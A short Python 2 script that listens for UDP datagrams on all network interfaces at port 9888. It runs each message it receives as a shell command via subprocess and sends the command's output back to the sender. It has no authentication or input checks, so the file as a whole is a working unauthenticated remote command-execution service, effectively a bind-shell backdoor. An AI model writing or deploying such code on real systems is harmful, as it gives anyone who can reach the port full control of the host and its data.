import subprocess
import socket
import sys

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
server_address = ('0.0.0.0', 9888)
sock.bind(server_address)

while True:
#    print >>sys.stderr, '\nwaiting to receive message'
    data, address = sock.recvfrom(4096)

#    print >>sys.stderr, 'received %s bytes from %s' % (len(data), address)
    print >>sys.stderr, data

    if data:
        command=data.split(" ")
        ret=subprocess.check_output(command)
        sent = sock.sendto(ret, address)
#        print >>sys.stderr, 'sent %s bytes back to %s' % (sent, address)
